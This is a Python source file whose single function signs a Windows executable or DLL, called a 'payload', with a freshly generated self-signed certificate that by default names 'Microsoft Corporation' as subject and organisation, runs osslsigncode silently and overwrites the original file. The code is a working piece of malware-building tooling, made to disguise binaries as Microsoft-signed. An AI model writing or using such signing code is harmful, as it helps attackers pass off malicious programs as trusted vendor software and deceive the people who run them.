import pathlib
import subprocess
import tempfile
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID
from datetime import datetime, timedelta

def self_sign_payload(payload_path: pathlib.Path, 
                subject_cn: str = "Microsoft Corporation",
                org_name: str = "Microsoft Corporation",
                build_path: pathlib.Path = None) -> None:
    """
    In-place self-signing of Windows executable.
    
    :param payload_path: Path to EXE/DLL to sign (overwritten with signed version)
    :param subject_cn: Certificate Common Name
    :param org_name: Certificate Organization Name
    """
    if not payload_path.exists():
        return

    with tempfile.TemporaryDirectory() as temp_dir:
        cert_path = pathlib.Path(temp_dir) / "cert.p12"
        signed_temp = pathlib.Path(temp_dir) / payload_path.name
        
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, subject_cn),
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, org_name),
        ])
        
        cert = (x509.CertificateBuilder()
                .subject_name(subject)
                .issuer_name(issuer)
                .public_key(private_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(datetime.utcnow())
                .not_valid_after(datetime.utcnow() + timedelta(days=365))
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                .sign(private_key, hashes.SHA256()))
        
        cert_path.write_bytes(
            serialization.pkcs12.serialize_key_and_certificates(
                name=b"signing",
                key=private_key,
                cert=cert,
                cas=None,
                encryption_algorithm=serialization.NoEncryption()
            )
        )
        
        subprocess.check_call([
            "osslsigncode", "sign",
            "-pkcs12", str(cert_path),
            "-t", "http://timestamp.digicert.com",
            "-in", str(payload_path),
            "-out", str(signed_temp),
            "-h", "sha256"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        

        signed_temp.replace(payload_path)
